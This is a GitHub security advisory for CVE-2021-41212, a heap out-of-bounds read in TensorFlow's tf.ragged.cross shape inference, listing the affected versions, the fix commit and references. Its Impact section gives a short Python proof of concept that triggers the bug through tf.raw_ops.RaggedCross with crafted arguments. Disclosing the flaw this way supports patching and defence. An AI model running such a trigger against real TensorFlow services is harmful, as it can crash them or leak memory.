# [H] Heap OOB read in `tf.ragged.cross`

## Summary
Severity: High
Advisory: GHSA-fr77-rrx3-cp7g
CVE: CVE-2021-41212
CWE: CWE-125
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:H (CVSS_V3)
Published: 2021-11-10
Source: https://github.com/advisories/GHSA-fr77-rrx3-cp7g
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=2.6.0 <2.6.1
- PyPI: `tensorflow` — affected >=2.5.0 <2.5.2
- PyPI: `tensorflow` — affected >=0 <2.4.4
- PyPI: `tensorflow-cpu` — affected >=2.6.0 <2.6.1
- PyPI: `tensorflow-cpu` — affected >=2.5.0 <2.5.2
- PyPI: `tensorflow-cpu` — affected >=0 <2.4.4
- PyPI: `tensorflow-gpu` — affected >=2.6.0 <2.6.1
- PyPI: `tensorflow-gpu` — affected >=2.5.0 <2.5.2
- PyPI: `tensorflow-gpu` — affected >=0 <2.4.4

## Details
### Impact
The [shape inference code for `tf.ragged.cross`](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/ops/ragged_array_ops.cc#L64) can trigger a read outside of bounds of heap allocated array:

```python
import tensorflow as tf

@tf.function
def test():
  y = tf.raw_ops.RaggedCross(ragged_values=[],
                             ragged_row_splits=[],
                             sparse_indices=[[5]],
                             sparse_values=[],
                             sparse_shape=[5],
                             dense_inputs=[['a']],
                             input_order='RD',
                             hashed_output=False,
                             num_buckets=5,
                             hash_key=2,
                             out_values_type=tf.string,
                             out_row_splits_type=tf.int64)
  return y

test()
```

### Patches
We have patched the issue in GitHub commit [fa6b7782fbb14aa08d767bc799c531f5e1fb3bb8](https://github.com/tensorflow/tensorflow/commit/fa6b7782fbb14aa08d767bc799c531f5e1fb3bb8).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.
  
### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
    
### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-fr77-rrx3-cp7g
- https://nvd.nist.gov/vuln/detail/CVE-2021-41212
- https://github.com/tensorflow/tensorflow/commit/fa6b7782fbb14aa08d767bc799c531f5e1fb3bb8
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-cpu/PYSEC-2021-621.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-gpu/PYSEC-2021-819.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow/PYSEC-2021-404.yaml
- https://github.com/tensorflow/tensorflow
